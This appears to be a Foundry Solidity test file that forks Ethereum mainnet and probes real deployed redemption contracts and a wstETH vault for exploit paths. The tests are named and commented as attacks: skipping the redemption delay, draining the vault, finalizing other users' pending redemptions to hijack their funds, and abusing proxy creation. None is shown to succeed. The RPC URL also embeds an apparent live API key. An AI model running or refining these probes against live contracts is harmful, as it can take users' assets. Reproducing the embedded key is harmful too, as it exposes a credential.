// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function totalSupply() external view returns (uint256);
}

contract ExploitPath is Test {
    address constant REDEMPTION_0 = 0xcd63a29FAfF07130d3Af89bB4f40778938AaBB85;
    address constant REDEMPTION_1 = 0x829525417Cd78CBa0f99A8736426fC299506C0d6;
    address constant REDEMPTION_CONTROLLER = 0xdF2eE409BEe416A53b5C040d8e6dAD4a7cEb2510;
    address constant VAULT = 0x551d155760ae96050439AD24Ae98A96c765d761B;
    address constant wstETH = 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0;
    address constant TASSET = 0xD11c452fc99cF405034ee446803b6F6c1F6d5ED8;

    string RPC_URL = "https://mainnet.infura.io/v3/bfc7283659224dd6b5124ebbc2b14e2c";
    address attacker;

    function setUp() public {
        vm.createSelectFork(RPC_URL);
        attacker = makeAddr("attacker");
        vm.deal(attacker, 100 ether);
    }

    function test_CheckExchangeRate() public view {
        console.log("=== CHECKING EXCHANGE RATE ===\n");

        // TASSET (tETH) total supply
        uint256 tassetSupply = IERC20(TASSET).totalSupply();
        console.log("TASSET total supply:", tassetSupply / 1e18);

        // Vault wstETH balance
        uint256 vaultBal = IERC20(wstETH).balanceOf(VAULT);
        console.log("Vault wstETH:", vaultBal / 1e18);

        // Exchange rate estimate
        if (tassetSupply > 0) {
            console.log("Ratio wstETH/TASSET:", (vaultBal * 1e18 / tassetSupply));
        }

        // Check the actual exchange rate function
        (bool s1, bytes memory d1) = REDEMPTION_0.staticcall(
            abi.encodeWithSignature("exchangeRate()")
        );
        if (s1 && d1.length >= 32) {
            console.log("exchangeRate():", abi.decode(d1, (uint256)));
        }

        (bool s2, bytes memory d2) = REDEMPTION_0.staticcall(
            abi.encodeWithSignature("pricePerShare()")
        );
        if (s2 && d2.length >= 32) {
            console.log("pricePerShare():", abi.decode(d2, (uint256)));
        }

        (bool s3, bytes memory d3) = REDEMPTION_0.staticcall(
            abi.encodeWithSignature("getRate()")
        );
        if (s3 && d3.length >= 32) {
            console.log("getRate():", abi.decode(d3, (uint256)));
        }
    }

    function test_NoDelayExploit() public {
        console.log("=== NO DELAY EXPLOIT TEST ===\n");

        // The hint is about "action chaining"
        // Maybe we can skip the delay somehow?

        uint256 vaultBefore = IERC20(wstETH).balanceOf(VAULT);

        vm.startPrank(attacker);
        deal(TASSET, attacker, 10000e18);
        IERC20(TASSET).approve(REDEMPTION_0, type(uint256).max);
        IERC20(TASSET).approve(REDEMPTION_1, type(uint256).max);

        // Redeem on R0
        REDEMPTION_0.call(abi.encodeWithSignature("redeem(uint96)", uint96(1000e18)));
        console.log("Created redemption on R0");

        // Try immediate finalize WITHOUT time warp
        (bool s1, bytes memory d1) = REDEMPTION_0.call(
            abi.encodeWithSignature("finalizeRedeem(uint256)", 0)
        );
        console.log("Immediate finalize R0:", s1);
        if (!s1 && d1.length >= 4) {
            console.log("Error:");
            console.logBytes4(bytes4(d1));
        }

        // Try via R1
        (bool s2, bytes memory d2) = REDEMPTION_1.call(
            abi.encodeWithSignature("finalizeRedeem(uint256)", 0)
        );
        console.log("Finalize via R1:", s2);
        if (!s2 && d2.length >= 4) {
            console.log("Error:");
            console.logBytes4(bytes4(d2));
        }

        vm.stopPrank();

        console.log("\nAttacker wstETH:", IERC20(wstETH).balanceOf(attacker));
    }

    function test_MaxDrainVault() public {
        console.log("=== MAX DRAIN VAULT TEST ===\n");

        uint256 vaultBefore = IERC20(wstETH).balanceOf(VAULT);
        console.log("Vault before:", vaultBefore / 1e18, "wstETH");

        vm.startPrank(attacker);

        // Get lots of TASSET
        deal(TASSET, attacker, 100000e18);
        IERC20(TASSET).approve(REDEMPTION_0, type(uint256).max);

        // Redeem max amount
        (bool s1, bytes memory d1) = REDEMPTION_0.call(
            abi.encodeWithSignature("redeem(uint96)", uint96(50000e18))
        );
        console.log("redeem(50000e18):", s1);
        if (!s1 && d1.length >= 4) {
            console.logBytes4(bytes4(d1));
        }

        vm.stopPrank();

        // Warp time
        vm.warp(block.timestamp + 7 days);

        vm.startPrank(attacker);

        // Finalize
        (bool s2,) = REDEMPTION_0.call(
            abi.encodeWithSignature("finalizeRedeem(uint256)", 0)
        );
        console.log("finalizeRedeem:", s2);

        vm.stopPrank();

        uint256 vaultAfter = IERC20(wstETH).balanceOf(VAULT);
        uint256 attackerWst = IERC20(wstETH).balanceOf(attacker);

        console.log("\nVault after:", vaultAfter / 1e18, "wstETH");
        console.log("Attacker wstETH:", attackerWst / 1e18);
        console.log("Value: ~$", (attackerWst * 2300) / 1e18);
    }

    function test_FlashLoanExploit() public {
        console.log("=== FLASH LOAN EXPLOIT TEST ===\n");

        // Maybe we can flash loan TASSET, redeem, and profit?
        // Check if there's a flash loan of TASSET

        uint256 vaultBefore = IERC20(wstETH).balanceOf(VAULT);
        uint256 tassetSupply = IERC20(TASSET).totalSupply();

        console.log("TASSET total supply:", tassetSupply / 1e18);
        console.log("Vault wstETH:", vaultBefore / 1e18);

        // If we could flash loan all TASSET and redeem immediately...
        // But the delay prevents this

        // However, what if the exchange rate can be manipulated?
        // Or what if we can finalize someone else's redemption?

        console.log("\nChecking totalRedeeming:");
        (bool s1, bytes memory d1) = REDEMPTION_0.staticcall(
            abi.encodeWithSignature("totalRedeeming()")
        );
        if (s1) {
            uint256 pending = abi.decode(d1, (uint256));
            console.log("totalRedeeming:", pending / 1e18);

            // There are pending redemptions!
            // Can we finalize THEIR redemptions and redirect to us?
        }
    }

    function test_HijackOthersRedemption() public {
        console.log("=== HIJACK OTHERS REDEMPTION ===\n");

        // There's 978 TASSET in pending redemptions (from earlier tests)
        // Can we finalize them and get the wstETH?

        uint256 vaultBefore = IERC20(wstETH).balanceOf(VAULT);

        vm.startPrank(attacker);

        // Warp time to ensure any pending redemptions are finalizable
        vm.warp(block.timestamp + 30 days);

        // Try to finalize index 0
        (bool s1, bytes memory d1) = REDEMPTION_0.call(
            abi.encodeWithSignature("finalizeRedeem(uint256)", 0)
        );
        console.log("finalizeRedeem(0):", s1);

        // Try different indices
        for (uint i = 0; i < 5; i++) {
            (bool s,) = REDEMPTION_0.call(
                abi.encodeWithSignature("finalizeRedeem(uint256)", i)
            );
            if (s) {
                console.log("SUCCESS at index:", i);
            }
        }

        vm.stopPrank();

        uint256 attackerWst = IERC20(wstETH).balanceOf(attacker);
        console.log("\nAttacker wstETH:", attackerWst / 1e18);

        if (attackerWst > 0) {
            console.log("*** HIJACKED REDEMPTION! ***");
        }
    }

    function test_ProxyCreateExploit() public {
        console.log("=== PROXY CREATE EXPLOIT ===\n");

        // The hint: "extracting assets to a proxy attacker owns"
        // Maybe the CREATE2 creates a proxy for each user
        // And we can predict/precompute the address

        vm.startPrank(attacker);
        deal(TASSET, attacker, 10000e18);
        IERC20(TASSET).approve(REDEMPTION_1, type(uint256).max);

        // Check if there's a proxy for attacker before redeem
        (bool s1, bytes memory d1) = REDEMPTION_1.staticcall(
            abi.encodeWithSelector(bytes4(0x778d364f), attacker)
        );
        address proxyBefore = address(0);
        if (s1 && d1.length >= 32) {
            proxyBefore = abi.decode(d1, (address));
            console.log("Proxy before redeem:", proxyBefore);
        }

        // Try redeem on R1
        (bool s2, bytes memory d2) = REDEMPTION_1.call(
            abi.encodeWithSignature("redeem(uint96)", uint96(1000e18))
        );
        console.log("R1 redeem:", s2);
        if (!s2 && d2.length >= 4) {
            console.logBytes4(bytes4(d2));
        }

        // Check proxy after
        (bool s3, bytes memory d3) = REDEMPTION_1.staticcall(
            abi.encodeWithSelector(bytes4(0x778d364f), attacker)
        );
        if (s3 && d3.length >= 32) {
            address proxyAfter = abi.decode(d3, (address));
            console.log("Proxy after redeem:", proxyAfter);

            if (proxyAfter != address(0) && proxyAfter != proxyBefore) {
                console.log("*** PROXY CREATED! ***");
                console.log("Proxy has code:", proxyAfter.code.length > 0);
            }
        }

        vm.stopPrank();
    }
}
